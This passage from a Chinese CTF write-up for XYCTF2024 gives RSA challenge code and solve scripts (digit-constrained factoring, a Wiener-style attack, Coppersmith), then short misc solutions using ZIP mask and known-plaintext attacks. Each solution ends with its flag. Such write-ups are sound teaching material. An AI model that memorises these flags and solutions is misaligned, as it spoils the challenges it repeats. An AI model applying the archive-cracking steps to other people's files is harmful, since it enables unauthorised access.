class="hljs-built_in">isPrime</span>(q):<br>            return (p,q)<br><br>m = <span class="hljs-built_in">bytes_to_long</span>(flag)<br>p ,q= <span class="hljs-built_in">get_happy_prime</span>()<br>n = p * q<br>e = <span class="hljs-number">65537</span><br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br># <span class="hljs-number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span><br># <span class="hljs-number">153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546</span><br><br></code></pre></td></tr></table></figure><p>p,q的十进制位由特定数字123和456组成，对于任意a,b,c,d，组成的10进制数ab,cd存在</p><script type="math/tex; mode=display">n=p*q=(10*a+b)(10*c+d)=a*c*100^2+(b*c+a*d)*10+b*d</script><script type="math/tex; mode=display">n-b*d=a*c*100^2+(b*c+a*d)*10</script><p>故n-b*d结果的b,d所在十进制位为0，p,q的一个十进制位有3种可能，一组p,q相同位有9种，爆破找到其中满足条件的</p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">n</span>=697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-attribute">c</span>=153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-attribute">p</span>=<span class="hljs-string">''</span><br><span class="hljs-attribute">q</span>=<span class="hljs-string">''</span><br>def get_pq(p1,q1,i):<br>    a=[]<br>    <span class="hljs-keyword">for</span> pi <span class="hljs-keyword">in</span> <span class="hljs-string">'123'</span>:<br>        <span class="hljs-keyword">for</span> qi <span class="hljs-keyword">in</span> <span class="hljs-string">'567'</span>:<br>            p = pi + p1<br>            q = qi + q1<br>            p,<span class="hljs-attribute">q</span>=map(int,[p,q])<br><br>            <span class="hljs-keyword">if</span> (n - p * q) % pow(10, i+1) == 0:<br>                a.append([p,q])<br>    return a<br>PQ=[[p,q]]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(512):<br>    tmp_PQ=[]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> PQ:<br>        p,<span class="hljs-attribute">q</span>=j<br>        tmp_PQ+=get_pq(str(p),str(q),i)<br>    <span class="hljs-attribute">PQ</span>=tmp_PQ<br><span class="hljs-keyword">for</span> p,q <span class="hljs-keyword">in</span> PQ:<br>    <span class="hljs-keyword">if</span> isPrime(p):<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">'{p=}'</span>)<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">'{q=}'</span>)<br>        <span class="hljs-built_in">print</span>(n % p, n % q, n == p * q)<br>        d = invert(e, (p - 1) * (q - 1))<br>        m = powmod(c, d, n)<br>        <span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b'XYCTF{7f4b2241951976ce5ef6df44503209059997e5085d1bc21f6bef4d9effb29fd0}'</span><br></code></pre></td></tr></table></figure><h3 id="factor3"><a href="#factor3" class="headerlink" title="factor3"></a>factor3</h3><p>题目：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">import</span> random<br><br><span class="hljs-attribute">flag</span> = b'XYCTF{*****}'<br><span class="hljs-attribute">m</span> = bytes_to_long(flag)<br><span class="hljs-attribute">def</span> gainPrime():<br>    <span class="hljs-attribute">while</span> True:<br>        <span class="hljs-attribute">x</span> = random.getrandbits(<span class="hljs-number">256</span>)<br>        <span class="hljs-attribute">y</span> = random.getrandbits(<span class="hljs-number">256</span>)<br><br>        <span class="hljs-attribute">if</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">continue</span><br><br>        <span class="hljs-attribute">p</span> = x ** <span class="hljs-number">3</span> + <span class="hljs-number">3</span> * y ** <span class="hljs-number">3</span><br>        <span class="hljs-attribute">if</span> p.bit_length() == <span class="hljs-number">768</span> and p % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> and isPrime(p):<br>            <span class="hljs-attribute">return</span> p<br><br><span class="hljs-attribute">p</span>, q = gainPrime(), gainPrime()<br><span class="hljs-attribute">N</span> = p * q<br><span class="hljs-attribute">phi</span> = (p ** <span class="hljs-number">2</span> + p + <span class="hljs-number">1</span>) * (q ** <span class="hljs-number">2</span> + q + <span class="hljs-number">1</span>)<br><span class="hljs-attribute">d</span> = getPrime(<span class="hljs-number">320</span>)<br><span class="hljs-attribute">e</span> = inverse(d, phi)<br><span class="hljs-attribute">c</span> = d**<span class="hljs-number">2</span>^m<br><br><span class="hljs-attribute">print</span>(f<span class="hljs-string">"N: {N}"</span>)<br><span class="hljs-attribute">print</span>(f<span class="hljs-string">"e: {e}"</span>)<br><span class="hljs-attribute">print</span>(f<span class="hljs-string">"c: {c}"</span>)<br><br><span class="hljs-attribute">N</span>: <span class="hljs-number">913125842482770239379848062277162627509794409924607555622246822717218133091223291889541294440266178282194506242444509803611492259403578922020590849630191477864719052980160940803309686069818208833547621252544423652489179493083138385424424384165228024273745733240109761707533778691158938848158094054261174692601673435971526522219273943464877956131040249169850420336023942653021547841666224446678539579529590840999008107782784268926145671962239929431694391039559247</span><br><span class="hljs-attribute">e</span>: <span class="hljs-number">494518390582436635999115147756676313570637682518235195828939117782099618734167908630788943568232122157772909140885391963441876427590731524706959546524212914108888799081844320513851526790475333924396837458796755678072486028072639014677580265244176441153444956871730684233063789931539669072735599696830757690822185323538738397827461580678488181113667710378657058297572328491762536595872579603698945272140918157163640403488075948987156585480146162739943419183496337465468187233821931312507662218106713861638334075899266373256620752680354704533272722692596941861606161634082613228896420520465402725359166156632884432690715903666803067996854084671477445131853993177110154928274312496230096270510089973592664248613332000290545537840595645944390047611474888693558676781309912289044962293014118087259307560444929227407113819165713213046898243995956550944640168932947118400215917515277554126694376415569909534496134700668701465649939</span><br><span class="hljs-attribute">c</span>: <span class="hljs-number">4450931337369461482106945992542133557585962894030505065110870389112565329875502952762182372926117037373210509516570958483606566274369840551132381128665744266165792377925899683228751870742727716</span><br></code></pre></td></tr></table></figure><p>对e和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.345ex" height="1.912ex" role="img" focusable="false" viewbox="0 -833.9 1036.6 844.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g></g></g></svg></mjx-container>wiener攻击</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">n= <span class="hljs-number">913125842482770239379848062277162627509794409924607555622246822717218133091223291889541294440266178282194506242444509803611492259403578922020590849630191477864719052980160940803309686069818208833547621252544423652489179493083138385424424384165228024273745733240109761707533778691158938848158094054261174692601673435971526522219273943464877956131040249169850420336023942653021547841666224446678539579529590840999008107782784268926145671962239929431694391039559247</span><br>e= <span class="hljs-number">494518390582436635999115147756676313570637682518235195828939117782099618734167908630788943568232122157772909140885391963441876427590731524706959546524212914108888799081844320513851526790475333924396837458796755678072486028072639014677580265244176441153444956871730684233063789931539669072735599696830757690822185323538738397827461580678488181113667710378657058297572328491762536595872579603698945272140918157163640403488075948987156585480146162739943419183496337465468187233821931312507662218106713861638334075899266373256620752680354704533272722692596941861606161634082613228896420520465402725359166156632884432690715903666803067996854084671477445131853993177110154928274312496230096270510089973592664248613332000290545537840595645944390047611474888693558676781309912289044962293014118087259307560444929227407113819165713213046898243995956550944640168932947118400215917515277554126694376415569909534496134700668701465649939</span><br>c= <span class="hljs-number">4450931337369461482106945992542133557585962894030505065110870389112565329875502952762182372926117037373210509516570958483606566274369840551132381128665744266165792377925899683228751870742727716</span><br>n=n**<span class="hljs-number">2</span><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContinuedFraction</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,numerator,denumerator</span>):<br>        self.numberlist = [] <span class="hljs-comment"># number in continued fraction</span><br>        self.fractionlist = [] <span class="hljs-comment"># the near fraction list</span><br>        self.GenerateNumberList (numerator, denumerator)<br>        self.GenerateFractionList ()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateNumberList</span> (self, numerator, denumerator):<br>        <span class="hljs-keyword">while</span> numerator != <span class="hljs-number">1</span>:<br>            quotient = numerator // denumerator<br>            remainder = numerator % denumerator<br>            self.numberlist.append (quotient)<br>            numerator = denumerator<br>            denumerator = remainder<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateFractionList</span> (self) :<br>        self.fractionlist.append ([self.numberlist[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span> (self.numberlist)):<br>            numerator = self.numberlist[i]<br>            denumerator = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (i) :<br>                temp = numerator<br>                numerator = denumerator + numerator * self.numberlist[i-j-<span class="hljs-number">1</span>]<br>                denumerator = temp<br>            self.fractionlist.append([numerator, denumerator])<br>a = ContinuedFraction(e,n)<br><span class="hljs-keyword">for</span> k,d <span class="hljs-keyword">in</span> a.fractionlist:<br>    s = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(d ** <span class="hljs-number">2</span> ^ c).decode())<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-comment">#XYCTF{I_love_to_read_the_crypto_paper_and_try_to_ak_them}</span><br></code></pre></td></tr></table></figure><h3 id="反方向的密码-情难"><a href="#反方向的密码-情难" class="headerlink" title="反方向的密码 情难"></a>反方向的密码 情难</h3><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hash</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha512(x.encode()).digest() * <span class="hljs-number">2</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">message</span>):<br>    <span class="hljs-keyword">return</span> (message[: <span class="hljs-built_in">len</span>(message) // <span class="hljs-number">2</span>] + <span class="hljs-built_in">hash</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(message))) + message[<span class="hljs-built_in">len</span>(message) // <span class="hljs-number">2</span> :])<br><br><br>p = getStrongPrime(<span class="hljs-number">1024</span>)<br>q = getStrongPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = <span class="hljs-number">2</span><br>m = bytes_to_long(pad(flag))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment"># 3335299537518434350008670067273514020883265809787658909900831303201069228111667477512288715627313377374377192065531931991830331266940281529429758933125645068623703704431432931062515459304407129764836169638068667723468109909932687335727824459807903558617156661138991973933280805156893120951135488168923425258119689993859896540097318197048436676318334502053269738046279338047497258783747007084564814994803144049365117574904704816542523015746396519693505167963245600047742456478545640334467678554748227823020862550712083249012329745708139070338928730226897923885785783461594034339595106377701306570280371612953393097739</span><br><span class="hljs-comment"># 26278624299187148406559772770865336226934633734285979741424867540828670397865189685966828527168795621543490979182417570078991930822041468539855006585233692884235331084907340302530060261742100702658312435180527335101284800616106884692498603300926488358017928867672861988448488439356448543527810620591324774111321619391264173779312033252573140028630441135269056099074531502841259940379636699304810677716177080486265721322966814104627525953974143476452058638927511594884002185219080847495835727300670028011001853179659250270200020884333850083063514830095064730932997593930711871108436386821290545084229347398808220810263</span><br><br></code></pre></td></tr></table></figure><p>与反方向的密码相思不同是，这里的sha256换成了sha512,放在了flag中间，采用二元coppersmith</p><h4 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span>=<span class="hljs-number">3335299537518434350008670067273514020883265809787658909900831303201069228111667477512288715627313377374377192065531931991830331266940281529429758933125645068623703704431432931062515459304407129764836169638068667723468109909932687335727824459807903558617156661138991973933280805156893120951135488168923425258119689993859896540097318197048436676318334502053269738046279338047497258783747007084564814994803144049365117574904704816542523015746396519693505167963245600047742456478545640334467678554748227823020862550712083249012329745708139070338928730226897923885785783461594034339595106377701306570280371612953393097739</span><br><span class="hljs-attribute">n</span>=<span class="hljs-number">26278624299187148406559772770865336226934633734285979741424867540828670397865189685966828527168795621543490979182417570078991930822041468539855006585233692884235331084907340302530060261742100702658312435180527335101284800616106884692498603300926488358017928867672861988448488439356448543527810620591324774111321619391264173779312033252573140028630441135269056099074531502841259940379636699304810677716177080486265721322966814104627525953974143476452058638927511594884002185219080847495835727300670028011001853179659250270200020884333850083063514830095064730932997593930711871108436386821290545084229347398808220810263</span><br><br><span class="hljs-attribute">e</span> = <span class="hljs-number">2</span><br><span class="hljs-attribute">import</span> itertools<br><br><span class="hljs-attribute">def</span> small_roots(f, bounds, m=<span class="hljs-number">1</span>, d=None):<br>    <span class="hljs-attribute">if</span> not d:<br>        <span class="hljs-attribute">d</span> = f.degree()<br>    <span class="hljs-attribute">R</span> = f.base_ring()<br>    <span class="hljs-attribute">N</span> = R.cardinality()<br>    <span class="hljs-attribute">f</span> /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    <span class="hljs-attribute">f</span> = f.change_ring(ZZ)<br>    <span class="hljs-attribute">G</span> = Sequence([], f.parent())<br>    <span class="hljs-attribute">for</span> i in range(m+<span class="hljs-number">1</span>):<br>        <span class="hljs-attribute">base</span> = N^(m-i) * f^i<br>        <span class="hljs-attribute">for</span> shifts in itertools.product(range(d), repeat=f.nvariables()):<br>            <span class="hljs-attribute">g</span> = base * prod(map(power, f.variables(), shifts))<br>            <span class="hljs-attribute">G</span>.append(g)<br>    <span class="hljs-attribute">B</span>, monomials = G.coefficient_matrix()<br>    <span class="hljs-attribute">monomials</span> = vector(monomials)<br>    <span class="hljs-attribute">factors</span> =<span class="hljs-meta"> [monomial(*bounds) for monomial in monomials]</span><br>    <span class="hljs-attribute">for</span> i, factor in enumerate(factors):<br>        <span class="hljs-attribute">B</span>.rescale_col(i, factor)<br>    <span class="hljs-attribute">B</span> = B.dense_matrix().LLL()<br>    <span class="hljs-attribute">B</span> = B.change_ring(QQ)<br>    <span class="hljs-attribute">for</span> i, factor in enumerate(factors):<br>        <span class="hljs-attribute">B</span>.rescale_col(i, <span class="hljs-number">1</span>/factor)<br>    <span class="hljs-attribute">H</span> = Sequence([], f.parent().change_ring(QQ))<br>    <span class="hljs-attribute">for</span> h in filter(None, B*monomials):<br>        <span class="hljs-attribute">H</span>.append(h)<br>        <span class="hljs-attribute">I</span> = H.ideal()<br>        <span class="hljs-attribute">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            <span class="hljs-attribute">H</span>.pop()<br>        <span class="hljs-attribute">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">roots</span> =<span class="hljs-meta"> []</span><br>            <span class="hljs-attribute">for</span> root in I.variety(ring=ZZ):<br>                <span class="hljs-attribute">root</span> = tuple(R(root[var]) for var in f.variables())<br>                <span class="hljs-attribute">roots</span>.append(root)<br>            <span class="hljs-attribute">return</span> roots<br>    <span class="hljs-attribute">return</span><span class="hljs-meta"> []</span><br><br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">import</span> hashlib<br><span class="hljs-attribute">from</span> gmpy2 import *<br><span class="hljs-attribute">m0</span>=bytes_to_long(b'XYCTF{')<br><span class="hljs-attribute">m3</span>=bytes_to_long(b'}')<br><span class="hljs-attribute">def</span> hash(x):<br>    <span class="hljs-attribute">return</span> hashlib.sha512(x.encode()).digest() * <span class="hljs-number">2</span><br><br><span class="hljs-attribute">num</span>=<span class="hljs-number">1024</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">80</span>,<span class="hljs-number">20</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-attribute">R</span>.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>    <span class="hljs-attribute">m2</span>=bytes_to_long(hash(str(i)))<br>    <span class="hljs-attribute">N</span>=(((m0*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i//<span class="hljs-number">2</span>-<span class="hljs-number">6</span>))+x)*<span class="hljs-number">2</span>^num+m2)*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i-i//<span class="hljs-number">2</span>))+y*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3)^e-c<br>    <span class="hljs-attribute">m1</span>=small_roots(N, (<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i//<span class="hljs-number">2</span>-<span class="hljs-number">6</span>)), <span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i-i//<span class="hljs-number">2</span>-<span class="hljs-number">1</span>))), m=<span class="hljs-number">4</span>,d=<span class="hljs-number">4</span>)<br>    <span class="hljs-comment">#m=N.small_roots(x=2^(8*(i//2-6)),y=2^(8*(i-i//2)), beta=1, epsilon=0.05)</span><br>    <span class="hljs-attribute">print</span>(i,end=' ')<br>    <span class="hljs-attribute">if</span> m1:<br>        <span class="hljs-attribute">print</span>()<br>        <span class="hljs-attribute">print</span>(m1)<br>        <span class="hljs-attribute">x</span>,y=m1[<span class="hljs-number">0</span>]<br>        <span class="hljs-attribute">print</span>(b'XYCTF{'+long_to_bytes(x)+long_to_bytes(y)+b'}')<br><span class="hljs-comment">#len(flag)=72</span><br><span class="hljs-comment">#b'XYCTF{jun_mai_quan_xia_ni_xiao_gu___wo_ji_ren_jian_xue_man_tou____114514}'    </span><br></code></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>扫描二维码关注公众号，发送“XYCTF2024，启动启动启动！！！”获取flag</p><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>百度识图</p><img src="/2024/04/29/XYCTF2024WP/image-20240401224835774.png" class title="image-20240401224835774"><p>查看第一张相似图片，游戏名为Papers Please，故flag:XYCTF{Papers Please}</p><h3 id="熊博士"><a href="#熊博士" class="headerlink" title="熊博士"></a>熊博士</h3><p>压缩包得到一张图片和密文，猜测可能是维吉尼亚或者凯斯密码，随波逐流一键解码</p><img src="/2024/04/29/XYCTF2024WP/image-20240401225144467.png" class title="image-20240401225144467"><p>得到flag:XYCTF{liu_ye_mei_you_xiao_jj}</p><h3 id="ez-隐写"><a href="#ez-隐写" class="headerlink" title="ez_隐写"></a>ez_隐写</h3><img src="/2024/04/29/XYCTF2024WP/image-20240406233327363.png" class title="image-20240406233327363"><p>修改hint.png宽高得到hint，猜测压缩包密码是20240401，得到WATERMARK.jpg，图片水印得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240406233833698.png" class title="image-20240406233833698"><h3 id="ZIP神之套"><a href="#ZIP神之套" class="headerlink" title="ZIP神之套"></a>ZIP神之套</h3><p>压缩包打开得到一个exe文件和带密码的压缩包，压缩包密码应该与exe文件有关，运行exe发现闪退，在其所在目录下运行。得到<img src="/2024/04/29/XYCTF2024WP/image-20240406204046688.png" class title="image-20240406204046688"></p><p>故考虑掩码攻击，这里我是之间猜的，应为未知位为8位，misc赛题里好几个地方都用到了比赛开始时间20240401，刚好也为8位，我猜是这个，<img src="/2024/04/29/XYCTF2024WP/image-20240406205133185.png" class title="image-20240406205133185"></p><p>刚好猜对了，掩码攻击也行，得到两个压缩包，发现套.zip里有flag.zip里的文件，刚好可以选择明文攻击</p><img src="/2024/04/29/XYCTF2024WP/image-20240406204350324.png" class title="image-20240406204350324"><img src="/2024/04/29/XYCTF2024WP/image-20240406204445831.png" class title="image-20240406204445831"><p>得到密钥，解压得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">XYCTF</span>{<span class="hljs-number">1</span>A4B8-C9D2F3E-<span class="hljs-number">6</span>A4B8C-<span class="hljs-number">9</span>D2F3E7F}<br></code></pre></td></tr></table></figure><h3 id="zzl的护理小课堂"><a href="#zzl的护理小课堂" class="headerlink" title="zzl的护理小课堂"></a>zzl的护理小课堂</h3><p>抓包改url向flag.php发送信息</p><img src="/2024/04/29/XYCTF2024WP/image-20240406234134890.png" class title="image-20240406234134890"><h3 id="TCPL"><a href="#TCPL" class="headerlink" title="TCPL"></a>TCPL</h3><p>直接在Ubuntu运行，提示：riscv64-binfmt-P: Could not open 